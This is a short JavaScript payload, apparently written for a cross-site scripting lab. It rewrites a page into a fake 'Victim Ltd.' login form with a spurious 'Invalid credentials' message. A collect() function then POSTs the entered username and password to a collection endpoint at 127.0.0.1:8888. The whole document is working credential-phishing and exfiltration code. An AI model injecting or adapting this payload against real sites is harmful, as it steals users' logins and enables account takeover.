html_content = document.getElementsByTagName('html')[0];
html_content.innerHTML = '<html><head><meta charset="utf-8"/><title>I am Victim</title></head><body><h1>Victim Ltd.</h1><hr/><h3>This one is a fake...</h3><div id="message"></div><form onsubmit="collect()" method="POST"><input type="text" name="username"/><input type="password" name="password"/><input type="submit" value="Log in"/></form></body></html>';

message_content = document.getElementById('message');
message_content.innerHTML = 'Invalid credentials';

function collect() {
    fetch("http://127.0.0.1:8888/collect", {
        body: "username=" + encodeURIComponent(this.event.target.elements.username.value) + "&password=" + encodeURIComponent(this.event.target.elements.password.value),
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        method: "POST"
    })
    this.event.preventDefault();
}
